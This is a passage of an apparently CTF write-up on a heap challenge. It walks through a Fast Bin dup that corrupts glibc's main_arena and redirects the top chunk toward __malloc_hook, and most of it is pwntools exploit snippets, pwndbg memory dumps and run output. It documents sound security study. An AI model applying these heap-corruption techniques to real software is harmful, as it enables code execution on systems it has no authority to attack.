0x7f365b0ca1f0, 0x7f365b0ca1f0...},  
+  binmap = {0x0, 0x0, 0x0, 0x0},
+  next = 0x7f365b0c9b60,
+  next_free = 0x0,
+  attached_threads = 0x1,
+  system_mem = 0x21000,
+  max_system_mem = 0x21000
+}
+<span class="code-red">pwndbg&gt; </span>x/30gx &main_arena
+<span class="code-dark-blue">0x7f365b0c9b60</span> &lt;<span class="code-dark-yellow">main_arena</span>&gt;:    0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7f365b0c9b70</span> &lt;<span class="code-dark-yellow">main_arena</span>+16&gt;: 0x0000000000000000      0x0000557f61bd64c0
+<span class="code-dark-blue">0x7f365b0c9b80</span> &lt;<span class="code-dark-yellow">main_arena</span>+32&gt;: 0x0000000000000000      0x0000557f61bd6420
+<span class="code-dark-blue">0x7f365b0c9b90</span> &lt;<span class="code-dark-yellow">main_arena</span>+48&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f365b0c9ba0</span> &lt;<span class="code-dark-yellow">main_arena</span>+64&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f365b0c9bb0</span> &lt;<span class="code-dark-yellow">main_arena</span>+80&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f365b0c9bc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x0000557f61bd64f0      0x0000000000000000
+<span class="code-dark-blue">0x7f365b0c9bd0</span> &lt;<span class="code-dark-yellow">main_arena</span>+112&gt;:        0x00007f365b0c9bc0      0x00007f365b0c9bc0
+<span class="code-dark-blue">0x7f365b0c9be0</span> &lt;<span class="code-dark-yellow">main_arena</span>+128&gt;:        0x00007f365b0c9bd0      0x00007f365b0c9bd0
+<span class="code-dark-blue">0x7f365b0c9bf0</span> &lt;<span class="code-dark-yellow">main_arena</span>+144&gt;:        0x00007f365b0c9be0      0x00007f365b0c9be0
+<span class="code-dark-blue">0x7f365b0c9c00</span> &lt;<span class="code-dark-yellow">main_arena</span>+160&gt;:        0x00007f365b0c9bf0      0x00007f365b0c9bf0
+<span class="code-dark-blue">0x7f365b0c9c10</span> &lt;<span class="code-dark-yellow">main_arena</span>+176&gt;:        0x00007f365b0c9c00      0x00007f365b0c9c00
+<span class="code-dark-blue">0x7f365b0c9c20</span> &lt;<span class="code-dark-yellow">main_arena</span>+192&gt;:        0x00007f365b0c9c10      0x00007f365b0c9c10
+<span class="code-dark-blue">0x7f365b0c9c30</span> &lt;<span class="code-dark-yellow">main_arena</span>+208&gt;:        0x00007f365b0c9c20      0x00007f365b0c9c20
+<span class="code-dark-blue">0x7f365b0c9c40</span> &lt;<span class="code-dark-yellow">main_arena</span>+224&gt;:        0x00007f365b0c9c30      0x00007f365b0c9c30
+<span class="code-red">pwndbg&gt; </span>bins
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x30</span>: <span class="code-dark-blue">0x557f61bd64c0</span> ◂— 0x0
+<span class="code-dark-yellow">0x50</span>: <span class="code-dark-blue">0x557f61bd6420</span> —▸ <span class="code-dark-blue">0x557f61bd6470</span> ◂— 0x557f61bd6420
+<span class="code-dark-blue">unsortedbin</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">smallbins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">largebins</span>
+<span class="code-dark-yellow">empty
+</code></pre></div><p>As can be seen we have some heap addresses in <code>main_arena</code> (heads of <code>0x30</code> and <code>0x50</code> Fast Bin chunks and the address of the top chunk, <code>0x0000557f61bd64f0</code>).</p><p>Notice as well that we have started the Fast Bin dup technique because we already have a double free in the <code>0x50</code>-sized Fast Bin. Now the idea is to allocate a <code>0x50</code>-sized chunk at <code>main_arena</code> (specifically, at the position of the <code>0x30</code> chunk address).</p><p>This part was mandatory, because there was not any other useful memory area where we could use Fast Bin dup. We could have chosen another Fast Bin free-list, but the chosen one works correctly. My idea was to modify the top chunk&rsquo;s address to an address above <code>__malloc_hook</code>, so that we can start allocating chunks until we fall near <code>__malloc_hook</code> and write something here to gain code execution.</p><p>For this, we need to align the memory a bit to take the offset for the Fast Bin dup attack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/20gx 0x7f365b0c9b60 + 21
+<span class="code-dark-blue">0x7f365b0c9b75</span> &lt;<span class="code-dark-yellow">main_arena</span>+21&gt;: 0x7f61bd64c0000000      0x0000000000000055
+<span class="code-dark-blue">0x7f365b0c9b85</span> &lt;<span class="code-dark-yellow">main_arena</span>+37&gt;: 0x7f61bd6420000000      0x0000000000000055
+<span class="code-dark-blue">0x7f365b0c9b95</span> &lt;<span class="code-dark-yellow">main_arena</span>+53&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f365b0c9ba5</span> &lt;<span class="code-dark-yellow">main_arena</span>+69&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f365b0c9bb5</span> &lt;<span class="code-dark-yellow">main_arena</span>+85&gt;: 0x0000000000000000      0x7f61bd64f0000000
+<span class="code-dark-blue">0x7f365b0c9bc5</span> &lt;<span class="code-dark-yellow">main_arena</span>+101&gt;:        0x0000000000000055      0x365b0c9bc0000000  
+<span class="code-dark-blue">0x7f365b0c9bd5</span> &lt;<span class="code-dark-yellow">main_arena</span>+117&gt;:        0x365b0c9bc000007f      0x365b0c9bd000007f
+<span class="code-dark-blue">0x7f365b0c9be5</span> &lt;<span class="code-dark-yellow">main_arena</span>+133&gt;:        0x365b0c9bd000007f      0x365b0c9be000007f
+<span class="code-dark-blue">0x7f365b0c9bf5</span> &lt;<span class="code-dark-yellow">main_arena</span>+149&gt;:        0x365b0c9be000007f      0x365b0c9bf000007f
+<span class="code-dark-blue">0x7f365b0c9c05</span> &lt;<span class="code-dark-yellow">main_arena</span>+165&gt;:        0x365b0c9bf000007f      0x365b0c9c0000007f
+</code></pre></div><p>So, <code>main_arena + 21</code>, let&rsquo;s try to mess with <code>main_arena</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.main_arena </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">21</span><span class="mtk1">))  </span><span class="mtk3"># 3</span>  
+
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">)  </span><span class="mtk3"># 4</span>
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)  </span><span class="mtk3"># 5</span>
+
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk8">cyclic</span><span class="mtk1">(</span><span class="mtk6">64</span><span class="mtk1">))  </span><span class="mtk3"># 6</span>
+</code></pre></div><p>From now on, the exploit might fail because most times heap addresses start with <code>0x55</code>, so the Fast Bin dup attack fails.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './da'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './da': pid 3495882
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './da', '3495882', '-x', '/tmp/pwnj0_ue88l.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Leaked __GI__IO_file_jumps address: 0x7f26625c7420
+[<span class="code-green">+</span>] Glibc base address: 0x7f2662216000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-blue">Dragons: [7/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><p>And here we have the corrupted <code>main_arena</code> structure:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>p/x main_arena
+$1 = {
+  mutex = 0x0,
+  flags = 0x0,
+  have_fastchunks = 0x1,
+  fastbinsY = {0x0, 0x56029b1354c0, 0x6161610000000000, 0x6161636161616261, 0x6161656161616461, 0x6161676161616661, 0x6161696161616861, 0x61616b6161616a61, 0x61616d6161616c61, 0x61616f6161616e61},
+  top = 0xa6161617061,
+  last_remainder = 0x0,
+  bins = {0x7f26625cabc0, 0x7f26625cabc0, 0x7f26625cabd0, 0x7f26625cabd0, 0x7f26625cabe0, 0x7f26625cabe0, 0x7f26625cabf0, 0x7f26625cabf0, 0x7f26625cac00, 0x7f26625cac00, 0x7f26625cac10, 0x7f26625cac10, 0x7f26625cac20, 0x7f26625cac20, 0x7f26625cac30, 0x7f26625cac30, 0x7f26625cac40, 0x7f26625cac40, 0x7f26625cac50, 0x7f26625cac50, 0x7f26625cac60, 0x7f26625cac60, 0x7f26625cac70, 0x7f26625cac70, 0x7f26625cac80, 0x7f26625cac80, 0x7f26625cac90, 0x7f26625cac90, 0x7f26625caca0, 0x7f26625caca0, 0x7f26625cacb0, 0x7f26625cacb0, 0x7f26625cacc0, 0x7f26625cacc0, 0x7f26625cacd0, 0x7f26625cacd0, 0x7f26625cace0, 0x7f26625cace0, 0x7f26625cacf0, 0x7f26625cacf0, 0x7f26625cad00, 0x7f26625cad00, 0x7f26625cad10, 0x7f26625cad10, 0x7f26625cad20, 0x7f26625cad20, 0x7f26625cad30, 0x7f26625cad30, 0x7f26625cad40, 0x7f26625cad40, 0x7f26625cad50, 0x7f26625cad50, 0x7f26625cad60, 0x7f26625cad60, 0x7f26625cad70, 0x7f26625cad70, 0x7f26625cad80, 0x7f26625cad80, 0x7f26625cad90, 0x7f26625cad90, 0x7f26625cada0, 0x7f26625cada0, 0x7f26625cadb0, 0x7f26625cadb0, 0x7f26625cadc0, 0x7f26625cadc0, 0x7f26625cadd0, 0x7f26625cadd0, 0x7f26625cade0, 0x7f26625cade0, 0x7f26625cadf0, 0x7f26625cadf0, 0x7f26625cae00, 0x7f26625cae00, 0x7f26625cae10, 0x7f26625cae10, 0x7f26625cae20, 0x7f26625cae20, 0x7f26625cae30, 0x7f26625cae30, 0x7f26625cae40, 0x7f26625cae40, 0x7f26625cae50, 0x7f26625cae50, 0x7f26625cae60, 0x7f26625cae60, 0x7f26625cae70, 0x7f26625cae70, 0x7f26625cae80, 0x7f26625cae80, 0x7f26625cae90, 0x7f26625cae90, 0x7f26625caea0, 0x7f26625caea0, 0x7f26625caeb0, 0x7f26625caeb0, 0x7f26625caec0, 0x7f26625caec0, 0x7f26625caed0, 0x7f26625caed0, 0x7f26625caee0, 0x7f26625caee0, 0x7f26625caef0, 0x7f26625caef0, 0x7f26625caf00, 0x7f26625caf00, 0x7f26625caf10, 0x7f26625caf10, 0x7f26625caf20, 0x7f26625caf20, 0x7f26625caf30, 0x7f26625caf30, 0x7f26625caf40, 0x7f26625caf40, 0x7f26625caf50, 0x7f26625caf50, 0x7f26625caf60, 0x7f26625caf60, 0x7f26625caf70, 0x7f26625caf70, 0x7f26625caf80, 0x7f26625caf80, 0x7f26625caf90, 0x7f26625caf90, 0x7f26625cafa0, 0x7f26625cafa0, 0x7f26625cafb0, 0x7f26625cafb0, 0x7f26625cafc0, 0x7f26625cafc0, 0x7f26625cafd0, 0x7f26625cafd0, 0x7f26625cafe0, 0x7f26625cafe0, 0x7f26625caff0, 0x7f26625caff0, 0x7f26625cb000, 0x7f26625cb000, 0x7f26625cb010, 0x7f26625cb010, 0x7f26625cb020, 0x7f26625cb020, 0x7f26625cb030, 0x7f26625cb030, 0x7f26625cb040, 0x7f26625cb040, 0x7f26625cb050, 0x7f26625cb050, 0x7f26625cb060, 0x7f26625cb060, 0x7f26625cb070, 0x7f26625cb070, 0x7f26625cb080, 0x7f26625cb080, 0x7f26625cb090, 0x7f26625cb090, 0x7f26625cb0a0, 0x7f26625cb0a0, 0x7f26625cb0b0, 0x7f26625cb0b0, 0x7f26625cb0c0, 0x7f26625cb0c0, 0x7f26625cb0d0, 0x7f26625cb0d0, 0x7f26625cb0e0, 0x7f26625cb0e0, 0x7f26625cb0f0, 0x7f26625cb0f0, 0x7f26625cb100, 0x7f26625cb100, 0x7f26625cb110, 0x7f26625cb110, 0x7f26625cb120, 0x7f26625cb120, 0x7f26625cb130, 0x7f26625cb130, 0x7f26625cb140, 0x7f26625cb140, 0x7f26625cb150, 0x7f26625cb150, 0x7f26625cb160, 0x7f26625cb160, 0x7f26625cb170, 0x7f26625cb170, 0x7f26625cb180, 0x7f26625cb180, 0x7f26625cb190, 0x7f26625cb190, 0x7f26625cb1a0, 0x7f26625cb1a0, 0x7f26625cb1b0, 0x7f26625cb1b0, 0x7f26625cb1c0, 0x7f26625cb1c0, 0x7f26625cb1d0, 0x7f26625cb1d0, 0x7f26625cb1e0, 0x7f26625cb1e0, 0x7f26625cb1f0, 0x7f26625cb1f0...},  
+  binmap = {0x0, 0x0, 0x0, 0x0},
+  next = 0x7f26625cab60,
+  next_free = 0x0,
+  attached_threads = 0x1,
+  system_mem = 0x21000,
+  max_system_mem = 0x21000
+}
+<span class="code-red">pwndbg&gt; </span>x/30gx &main_arena
+<span class="code-dark-blue">0x7f26625cab60</span> &lt;<span class="code-dark-yellow">main_arena</span>&gt;:    0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7f26625cab70</span> &lt;<span class="code-dark-yellow">main_arena</span>+16&gt;: 0x0000000000000000      0x000056029b1354c0
+<span class="code-dark-blue">0x7f26625cab80</span> &lt;<span class="code-dark-yellow">main_arena</span>+32&gt;: 0x6161610000000000      0x6161636161616261
+<span class="code-dark-blue">0x7f26625cab90</span> &lt;<span class="code-dark-yellow">main_arena</span>+48&gt;: 0x6161656161616461      0x6161676161616661
+<span class="code-dark-blue">0x7f26625caba0</span> &lt;<span class="code-dark-yellow">main_arena</span>+64&gt;: 0x6161696161616861      0x61616b6161616a61
+<span class="code-dark-blue">0x7f26625cabb0</span> &lt;<span class="code-dark-yellow">main_arena</span>+80&gt;: 0x61616d6161616c61      0x61616f6161616e61
+<span class="code-dark-blue">0x7f26625cabc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x00000a6161617061      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cabd0</span> &lt;<span class="code-dark-yellow">main_arena</span>+112&gt;:        0x00007f26625cabc0      0x00007f26625cabc0
+<span class="code-dark-blue">0x7f26625cabe0</span> &lt;<span class="code-dark-yellow">main_arena</span>+128&gt;:        0x00007f26625cabd0      0x00007f26625cabd0
+<span class="code-dark-blue">0x7f26625cabf0</span> &lt;<span class="code-dark-yellow">main_arena</span>+144&gt;:        0x00007f26625cabe0      0x00007f26625cabe0
+<span class="code-dark-blue">0x7f26625cac00</span> &lt;<span class="code-dark-yellow">main_arena</span>+160&gt;:        0x00007f26625cabf0      0x00007f26625cabf0
+<span class="code-dark-blue">0x7f26625cac10</span> &lt;<span class="code-dark-yellow">main_arena</span>+176&gt;:        0x00007f26625cac00      0x00007f26625cac00
+<span class="code-dark-blue">0x7f26625cac20</span> &lt;<span class="code-dark-yellow">main_arena</span>+192&gt;:        0x00007f26625cac10      0x00007f26625cac10
+<span class="code-dark-blue">0x7f26625cac30</span> &lt;<span class="code-dark-yellow">main_arena</span>+208&gt;:        0x00007f26625cac20      0x00007f26625cac20
+<span class="code-dark-blue">0x7f26625cac40</span> &lt;<span class="code-dark-yellow">main_arena</span>+224&gt;:        0x00007f26625cac30      0x00007f26625cac30
+</code></pre></div><p>At this point, we need to find a valid address for the top chunk. This value must be aligned and must contain a valid size for the heap allocator. If we take a look to some addresses above <code>__malloc_hook</code>, we have this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/100gx &__malloc_hook - 70
+<span class="code-dark-blue">0x7f26625ca920</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+192&gt;:   0x0000000000000000      0x0000000000000000  
+<span class="code-dark-blue">0x7f26625ca930</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+208&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625ca940</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+224&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625ca950</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+240&gt;:   0x00007f26625c6ee0      0x0000000000000000
+<span class="code-dark-blue">0x7f26625ca960</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>&gt;:        0x00000000fbad2088      0x000056029b134420
+<span class="code-dark-blue">0x7f26625ca970</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+16&gt;:     0x000056029b134420      0x000056029b134420
+<span class="code-dark-blue">0x7f26625ca980</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+32&gt;:     0x000056029b134420      0x000056029b134420
+<span class="code-dark-blue">0x7f26625ca990</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+48&gt;:     0x000056029b134420      0x000056029b134420
+<span class="code-dark-blue">0x7f26625ca9a0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+64&gt;:     0x000056029b135420      0x0000000000000000
+<span class="code-dark-blue">0x7f26625ca9b0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+80&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625ca9c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+96&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625ca9d0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+112&gt;:    0x0000000000000000      0xffffffffffffffff
+<span class="code-dark-blue">0x7f26625ca9e0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+128&gt;:    0x0000000000000000      0x00007f26625cc7d0
+<span class="code-dark-blue">0x7f26625ca9f0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+144&gt;:    0xffffffffffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa00</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+160&gt;:    0x00007f26625caa40      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa10</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+176&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa20</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+192&gt;:    0x00000000ffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa30</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+208&gt;:    0x0000000000000000      0x00007f26625c7420
+<span class="code-dark-blue">0x7f26625caa40</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa50</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+16&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa60</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+32&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa70</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+48&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa80</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+64&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caa90</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+80&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caaa0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+96&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caab0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+112&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caac0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+128&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caad0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+144&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caae0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+160&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625caaf0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+176&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cab00</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+192&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cab10</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+208&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cab20</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+224&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cab30</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+240&gt;:   0x00007f26625c6ee0      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cab40</span> &lt;<span class="code-dark-yellow">__memalign_hook</span>&gt;:       0x00007f2662299a10      0x00007f2662299ed0
+<span class="code-dark-blue">0x7f26625cab50</span> &lt;<span class="code-dark-yellow">__malloc_hook</span>&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cab60</span> &lt;<span class="code-dark-yellow">main_arena</span>&gt;:    0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7f26625cab70</span> &lt;<span class="code-dark-yellow">main_arena</span>+16&gt;: 0x0000000000000000      0x000056029b1354c0
+<span class="code-dark-blue">0x7f26625cab80</span> &lt;<span class="code-dark-yellow">main_arena</span>+32&gt;: 0x6161610000000000      0x6161636161616261
+<span class="code-dark-blue">0x7f26625cab90</span> &lt;<span class="code-dark-yellow">main_arena</span>+48&gt;: 0x6161656161616461      0x6161676161616661
+<span class="code-dark-blue">0x7f26625caba0</span> &lt;<span class="code-dark-yellow">main_arena</span>+64&gt;: 0x6161696161616861      0x61616b6161616a61
+<span class="code-dark-blue">0x7f26625cabb0</span> &lt;<span class="code-dark-yellow">main_arena</span>+80&gt;: 0x61616d6161616c61      0x61616f6161616e61
+<span class="code-dark-blue">0x7f26625cabc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x00000a6161617061      0x0000000000000000
+<span class="code-dark-blue">0x7f26625cabd0</span> &lt;<span class="code-dark-yellow">main_arena</span>+112&gt;:        0x00007f26625cabc0      0x00007f26625cabc0
+<span class="code-dark-blue">0x7f26625cabe0</span> &lt;<span class="code-dark-yellow">main_arena</span>+128&gt;:        0x00007f26625cabd0      0x00007f26625cabd0
+<span class="code-dark-blue">0x7f26625cabf0</span> &lt;<span class="code-dark-yellow">main_arena</span>+144&gt;:        0x00007f26625cabe0      0x00007f26625cabe0
+<span class="code-dark-blue">0x7f26625cac00</span> &lt;<span class="code-dark-yellow">main_arena</span>+160&gt;:        0x00007f26625cabf0      0x00007f26625cabf0
+<span class="code-dark-blue">0x7f26625cac10</span> &lt;<span class="code-dark-yellow">main_arena</span>+176&gt;:        0x00007f26625cac00      0x00007f26625cac00
+<span class="code-dark-blue">0x7f26625cac20</span> &lt;<span class="code-dark-yellow">main_arena</span>+192&gt;:        0x00007f26625cac10      0x00007f26625cac10
+<span class="code-dark-blue">0x7f26625cac30</span> &lt;<span class="code-dark-yellow">main_arena</span>+208&gt;:        0x00007f26625cac20      0x00007f26625cac20
+</code></pre></div><p>There is nothing similar to a chunk size&mldr; But we have more addresses that start with <code>0x56</code>, so we can do a second Fast Bin dup to allocate a chunk there and enter a valid size for the top chunk. This is a valid approach, but it is not efficient in allocations, so we won&rsquo;t be able to complete the exploit due to the limit of 13 allocations&mldr; However, since we control <code>main_arena</code>, we can enter the address of the next <code>0x50</code>-sized chunk to be allocated in the corresponding Fast Bin free-list. Then, just allocate that chunk and enter the fake size at an offset of <code>_IO_2_1_stdin_</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_2_1_stdin_</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">61</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_2_1_stdin_</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">112</span><span class="mtk1">))  </span><span class="mtk3"># 6</span>  
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">1fb11</span><span class="mtk1">))  </span><span class="mtk3"># 7</span>
+</code></pre></div><p>So, we have this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './da'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './da': pid 3502562
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './da', '3502562', '-x', '/tmp/pwnw3k7rv11.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Leaked __GI__IO_file_jumps address: 0x7fc0032b9420
+[<span class="code-green">+</span>] Glibc base address: 0x7fc002f08000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-blue">Dragons: [8/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
